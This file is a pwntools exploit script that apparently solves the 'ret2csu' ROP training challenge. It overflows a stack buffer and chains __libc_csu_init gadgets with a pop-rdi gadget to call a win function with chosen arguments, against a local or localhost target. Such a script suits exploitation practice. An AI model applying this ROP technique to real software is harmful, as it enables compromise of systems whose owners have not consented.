#!/usr/bin/python3
from pwn import *
gs = '''
break *0x40069a
continue
'''
elf = context.binary = ELF('./ret2csu')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./ret2csu', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./ret2csu')
r = start()
#========= exploit here ===================
ret2win = 0x400510 #edx esi edi
pops = 0x40069a #rbx rbp r12 r13 r14 r15
mov = 0x400680 #movs
poprdi = 0x4006a3
fini_ptr = 0x6003b0
payload = "A" * 0x28
payload += p64(pops)
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(fini_ptr) #r12
payload += "DPLADPLA" #r13
payload += p64(0xcafebabecafebabe) #r14 
payload += p64(0xd00df00dd00df00d) #r15
payload += p64(mov)
payload += "DPLADPLA" #because of the add rsp + 8
payload += p64(0) #
payload += p64(0) #
payload += p64(0) #
payload += p64(0) #
payload += p64(0) #
payload += p64(0) #
payload += p64(poprdi)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(ret2win)

r.sendlineafter(">",payload)
#========= interactive ====================
r.interactive()


